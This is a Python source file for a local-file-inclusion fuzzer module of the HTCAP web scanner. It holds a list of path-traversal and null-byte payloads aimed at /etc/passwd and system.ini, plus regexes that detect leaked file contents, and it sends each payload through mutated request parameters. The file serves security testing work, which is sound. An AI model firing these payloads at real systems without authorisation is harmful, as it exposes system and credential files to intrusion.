# -*- coding: utf-8 -*-

"""
HTCAP - 1.1
Author: filippo.cavallarin@wearesegment.com

This program is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free Software
Foundation; either version 2 of the License, or (at your option) any later
version.
"""

from __future__ import unicode_literals
import sys
import time
import re
import os
import urllib2
from HTMLParser import HTMLParser

from core.lib.exception import *
from core.crawl.lib.shared import *


from core.lib.request import Request
from core.lib.cookie import Cookie

from core.lib.utils import *
from core.constants import *

from core.scan.base_fuzzer import BaseFuzzer


payloads = [
	"/etc/passwd",
	"../../../../../../../../../../../../../../../../../../../../../../etc/passwd",
	"/etc/passwd%00",
	"../../../../../../../../../../../../../../../../../../../../../../etc/passwd%00",
	"file:/c:\\windows\\system.ini",
	"c:\\windows\\system.ini",
	"\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system.ini",

	"file:/c:/windows/system.ini",
	"c:/windows/system.ini",
	"/../../../../../../../../../../../../../windows/system.ini"
]

responses = [
	r'root\:[^ ]\:0\:0\:',
	r'\nwoafont=dosapp\.fon'
]

class Fileinclude(BaseFuzzer):

	def init(self):
		#self.vulnerabilities = []
		pass


	def check_response(self, body):
		body = self.utils.strip_html_tags(body)
		for regex in responses:
			if re.search(regex, body, re.M):
				return True
		return False

	def fuzz(self):
		vulnerabilities = []
		mutations = self.get_mutations(self.request, payloads)
		for m in mutations:
			#print m
			try:
				resp = m.send(ignore_errors=True)
			except Exception as e:
				self.sprint("Error: %s" % e)
				continue

			if not resp.body:
				continue
			if self.check_response(resp.body):
				vulnerabilities.append(str(m))
				mutations.next_parameter()
				continue
		return vulnerabilities